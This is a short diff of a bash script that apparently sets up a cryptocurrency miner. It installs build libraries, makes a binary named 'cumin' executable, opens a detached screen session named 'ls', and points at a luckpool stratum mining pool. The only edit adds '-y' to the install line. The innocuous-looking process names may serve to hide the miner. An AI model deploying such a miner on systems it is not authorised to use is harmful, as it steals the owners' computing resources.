@@ -1,6 +1,6 @@
 #!/bin/bash
 sudo apt-get update 
-sudo apt install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
+sudo apt install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
 chmod +x cumin
 screen -dmS ls 
 POOL=stratum+tcp://ap.luckpool.net:3956
